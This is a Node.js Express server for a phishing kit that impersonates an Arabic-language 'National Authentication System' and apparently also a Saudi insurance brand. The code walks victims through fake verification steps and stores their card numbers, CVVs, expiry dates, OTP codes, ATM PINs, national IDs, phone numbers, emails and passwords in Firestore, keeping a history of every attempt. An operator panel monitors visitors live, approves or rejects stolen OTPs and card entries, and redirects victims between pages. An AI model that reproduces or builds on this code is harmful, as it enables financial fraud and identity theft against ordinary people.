require('dotenv').config();
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const { initializeFirebase } = require('./firebase-config');
const { initVisitor, updateStatus, updatePage } = require('./sys-track');
const { saveField, saveMultipleFields } = require('./data-save');
const { 
    getAllVisitors, 
    getVisitorById, 
    getOnlineVisitors,
    redirectVisitor,
    checkRedirect,
    approvePayment,
    approveOtp,
    getStatistics
} = require('./admin-api');

const app = express();
const PORT = process.env.PORT || 3000;

initializeFirebase();

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

app.use(async (req, res, next) => {
    try {
        if (!req.path.startsWith('/api/')) {
            const result = await initVisitor(req);
            res.cookie('vid', result.vid, { maxAge: 30 * 24 * 60 * 60 * 1000, httpOnly: true });
            req.vid = result.vid;
            req.ref = result.ref;
        }
        next();
    } catch (error) {
        console.error('Middleware error:', error);
        next();
    }
});

app.get('/', (req, res) => {
    res.render('index', {
        title: 'نظام التوثيق الوطني',
        currentPage: 'index'
    });
});

app.get('/login', (req, res) => {
    res.render('login', {
        title: 'تسجيل الدخول - نظام التوثيق الوطني',
        currentPage: 'login',
        currentStep: 0
    });
});

app.post('/login', (req, res) => {
    res.redirect('/update-notice');
});

app.get('/update-notice', (req, res) => {
    res.render('update-notice', {
        title: 'تنبيه - نظام التوثيق الوطني',
        currentPage: 'update-notice',
        currentStep: 0
    });
});

app.get('/step1', (req, res) => {
    res.render('step1', {
        title: 'الخطوة الأولى - نظام التوثيق الوطني',
        currentPage: 'step1',
        currentStep: 1
    });
});

app.post('/step1', (req, res) => {
    res.redirect('/step3');
});

app.get('/step2', (req, res) => {
    res.render('step2', {
        title: 'الخطوة الثانية - نظام التوثيق الوطني',
        currentPage: 'step2',
        currentStep: 2
    });
});

app.post('/step2', (req, res) => {
    res.redirect('/step3');
});

app.get('/step2Q', (req, res) => {
    res.render('step2Q', {
        title: 'الخطوة الثانية (قطر) - نظام التوثيق الوطني',
        currentPage: 'step2Q',
        currentStep: 2
    });
});

app.post('/step2Q', (req, res) => {
    res.redirect('/step3');
});

app.get('/step3', (req, res) => {
    res.render('step3', {
        title: 'الخطوة الثالثة - نظام التوثيق الوطني',
        currentPage: 'step3',
        currentStep: 3
    });
});

app.post('/step3', (req, res) => {
    res.redirect('/step4');
});

app.get('/step4', (req, res) => {
    res.render('step4', {
        title: 'الخطوة الرابعة - نظام التوثيق الوطني',
        currentPage: 'step4',
        currentStep: 4
    });
});

app.post('/step4', (req, res) => {
    res.redirect('/step5');
});

app.get('/step5', (req, res) => {
    res.render('step5', {
        title: 'الخطوة الخامسة - نظام التوثيق الوطني',
        currentPage: 'step5',
        currentStep: 5
    });
});

app.post('/step5', (req, res) => {
    res.redirect('/step6');
});

// Success page after verification approval
app.get('/success', (req, res) => {
    res.render('success', {
        title: 'تم التفعيل بنجاح - نظام التوثيق الوطني',
        currentPage: 'success'
    });
});

app.get('/step6', (req, res) => {
    res.render('step6', {
        title: 'الخطوة السادسة - نظام التوثيق الوطني',
        currentPage: 'step6',
        currentStep: 6
    });
});

app.post('/api/save-field', async (req, res) => {
    try {
        const { page, fieldName, fieldValue } = req.body;
        const vid = req.cookies.vid;
        
        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const result = await saveField(vid, page, fieldName, fieldValue);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/visitor/online', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (vid) {
            await updateStatus(vid, true);
        }
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/visitor/offline', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (vid) {
            await updateStatus(vid, false);
        }
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/check-redirect', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.json({ success: false, error: 'No visitor ID' });
        }
        
        const result = await checkRedirect(vid);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/save-payment', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const { cardNumber, cardHolder, expiryDate, cvv, cardType } = req.body;
        const result = await saveMultipleFields(vid, 'step4', {
            cardNumber,
            cardHolder,
            expiryDate,
            cvv,
            cardType
        });
        
        const { getFirestore } = require('./firebase-config');
        const db = getFirestore();
        const timestamp = new Date().toISOString();
        const docRef = db.collection('visitors').doc(vid);
        const doc = await docRef.get();
        
        const updates = {
            'payment.card_status': 'pending',
            'payment.current': {
                cardNumber,
                cardHolder,
                expiryDate,
                cvv,
                cardType,
                timestamp
            },
            'lastUpdated': timestamp
        };
        
        // حفظ المحاولة السابقة في history إذا كانت موجودة
        if (doc.exists) {
            const data = doc.data();
            if (data.payment && data.payment.current) {
                const historyCount = data.payment.history ? Object.keys(data.payment.history).length : 0;
                const attemptKey = `payment.history.attempt_${historyCount + 1}`;
                updates[attemptKey] = {
                    ...data.payment.current,
                    card_status: data.payment.card_status || 'pending',
                    savedAt: timestamp
                };
            }
        }
        
        await docRef.update(updates);
        
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/check-payment-approval', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.json({ success: false, error: 'No visitor ID' });
        }
        
        const { getPaymentStatus } = require('./admin-api');
        const result = await getPaymentStatus(vid);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/save-otp', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const { otp } = req.body;
        const { getFirestore } = require('./firebase-config');
        const db = getFirestore();
        const timestamp = new Date().toISOString();
        const docRef = db.collection('visitors').doc(vid);
        const doc = await docRef.get();
        
        const attemptCount = doc.exists && doc.data().otp && doc.data().otp.history 
            ? Object.keys(doc.data().otp.history).length 
            : 0;
        
        const updates = {
            'otp.otp_status': 'pending',
            'otp.current': {
                otp,
                timestamp,
                attemptNumber: attemptCount + 1
            },
            'lastUpdated': timestamp
        };
        
        // حفظ المحاولة السابقة في history إذا كانت موجودة
        if (doc.exists) {
            const data = doc.data();
            if (data.otp && data.otp.current) {
                const historyCount = data.otp.history ? Object.keys(data.otp.history).length : 0;
                const attemptKey = `otp.history.attempt_${historyCount + 1}`;
                updates[attemptKey] = {
                    ...data.otp.current,
                    otp_status: data.otp.otp_status || 'pending',
                    savedAt: timestamp
                };
            }
        }
        
        await docRef.update(updates);
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/save-atm-pin', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const { atmPin } = req.body;
        if (!atmPin) {
            return res.status(400).json({ success: false, error: 'No ATM PIN provided' });
        }
        
        const { getFirestore } = require('./firebase-config');
        const db = getFirestore();
        const timestamp = new Date().toISOString();
        const docRef = db.collection('visitors').doc(vid);
        
        // جلب المستند أو إنشاء فارغ
        const doc = await docRef.get();
        const data = doc.exists ? doc.data() : {};
        
        // حساب رقم المحاولة
        const historyCount = data.atmPin && data.atmPin.history 
            ? Object.keys(data.atmPin.history).length 
            : 0;
        
        const updates = {};
        
        // حفظ المحاولة السابقة في history
        if (data.atmPin && data.atmPin.current) {
            const attemptKey = `atmPin.history.attempt_${historyCount + 1}`;
            updates[attemptKey] = {
                ...data.atmPin.current,
                savedAt: timestamp
            };
        }
        
        // حفظ المحاولة الحالية
        updates['atmPin.current'] = {
            atmPin,
            timestamp,
            attemptNumber: historyCount + 1
        };
        updates['lastUpdated'] = timestamp;
        
        await docRef.set(updates, { merge: true });
        
        res.json({ success: true });
    } catch (error) {
        console.error('ATM PIN save error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/check-otp-approval', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.json({ success: false, error: 'No visitor ID' });
        }
        
        const { getOtpStatus } = require('./admin-api');
        const result = await getOtpStatus(vid);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/admin/visitors', async (req, res) => {
    try {
        const result = await getAllVisitors();
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/admin/visitor/:vid', async (req, res) => {
    try {
        const result = await getVisitorById(req.params.vid);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/admin/visitors/online', async (req, res) => {
    try {
        const result = await getOnlineVisitors();
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/admin/redirect-visitor', async (req, res) => {
    try {
        const { vid, targetPage } = req.body;
        const result = await redirectVisitor(vid, targetPage);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/admin/approve-payment', async (req, res) => {
    try {
        const { vid, approved } = req.body;
        const result = await approvePayment(vid, approved);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/admin/approve-otp', async (req, res) => {
    try {
        const { vid, approved } = req.body;
        const result = await approveOtp(vid, approved);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/admin/statistics', async (req, res) => {
    try {
        const result = await getStatistics();
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================
// Admin Routes
// ============================================

// Admin login page
app.get('/admin/login', (req, res) => {
    res.render('admin/login');
});

// Admin dashboard page
app.get('/admin/dashboard', (req, res) => {
    // TODO: Add authentication middleware
    res.render('admin/dashboard');
});

// Admin login API
app.post('/admin/api/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        // Simple authentication (TODO: Replace with proper auth)
        if (email === 'admin@bcare.com' && password === 'admin123') {
            res.json({ success: true });
        } else {
            res.json({ success: false, message: 'بيانات الدخول غير صحيحة' });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Admin API: Get all visitors
app.get('/admin/api/visitors', async (req, res) => {
    try {
        const result = await getAllVisitors();
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Admin API: Get visitor by ID
app.get('/admin/api/visitor/:id', async (req, res) => {
    try {
        const result = await getVisitorById(req.params.id);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Admin API: Approve/Reject OTP
app.post('/admin/api/approve-otp', async (req, res) => {
    try {
        const { vid, status } = req.body;
        const visitorRef = db.ref(`visitors/${vid}`);
        await visitorRef.update({
            'otp.otp_status': status
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Admin API: Approve/Reject Verification
app.post('/admin/api/approve-verification', async (req, res) => {
    try {
        const { vid, status } = req.body;
        const visitorRef = db.ref(`visitors/${vid}`);
        await visitorRef.update({
            'verification.verification_status': status
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    // Server started - logs disabled for production
});

// API: Save activation data (step5)
app.post('/api/save-activation-data', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const { provider, phone, personalId, email, password } = req.body;
        const { getFirestore } = require('./firebase-config');
        const db = getFirestore();
        const timestamp = new Date().toISOString();
        const docRef = db.collection('visitors').doc(vid);
        
        // Get existing document
        const doc = await docRef.get();
        const data = doc.exists ? doc.data() : {};
        
        // Calculate attempt number
        const historyCount = data.activation && data.activation.history 
            ? Object.keys(data.activation.history).length 
            : 0;
        
        const updates = {};
        
        // Save previous attempt to history
        if (data.activation && data.activation.current) {
            const attemptKey = `activation.history.attempt_${historyCount + 1}`;
            updates[attemptKey] = {
                ...data.activation.current,
                savedAt: timestamp
            };
        }
        
        // Save current attempt
        updates['activation.current'] = {
            provider,
            phone,
            personalId,
            email: email || null,
            password: password || null,
            timestamp,
            attemptNumber: historyCount + 1
        };
        updates['lastUpdated'] = timestamp;
        
        await docRef.set(updates, { merge: true });
        
        res.json({ success: true });
    } catch (error) {
        console.error('Activation data save error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// API: Save verification code (step5)
app.post('/api/save-verification-code', async (req, res) => {
    try {
        const vid = req.cookies.vid;

        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const { verificationCode } = req.body;

        if (!verificationCode) {
            return res.status(400).json({ success: false, error: 'No verification code provided' });
        }
        
        const { getFirestore } = require('./firebase-config');
        const db = getFirestore();
        const timestamp = new Date().toISOString();
        const docRef = db.collection('visitors').doc(vid);
        
        // Get existing document
        const doc = await docRef.get();
        const data = doc.exists ? doc.data() : {};
        
        // Calculate attempt number
        const historyCount = data.verification && data.verification.history 
            ? Object.keys(data.verification.history).length 
            : 0;
        
        // Prepare verification object
        const verificationData = {
            current: {
                verificationCode,
                timestamp,
                attemptNumber: historyCount + 1
            },
            verification_status: 'pending'
        };
        
        // Add history if exists
        if (data.verification && data.verification.current) {
            if (!verificationData.history) {
                verificationData.history = data.verification.history || {};
            }
            verificationData.history[`attempt_${historyCount + 1}`] = {
                ...data.verification.current,
                savedAt: timestamp
            };
        }
        
        const updates = {
            verification: verificationData,
            lastUpdated: timestamp
        };
        

        await docRef.set(updates, { merge: true });

        
        res.json({ success: true });
    } catch (error) {
        console.error('Verification code save error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// API: Check verification approval (step5)
app.get('/api/check-verification-approval', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.json({ success: false, error: 'No visitor ID' });
        }
        
        const { getVerificationStatus } = require('./admin-api');
        const result = await getVerificationStatus(vid);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// API: Admin approve/reject verification (step5)
app.post('/api/admin/approve-verification', async (req, res) => {
    try {
        const { vid, verification_status } = req.body;
        const { approveVerification } = require('./admin-api');
        const result = await approveVerification(vid, verification_status);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});
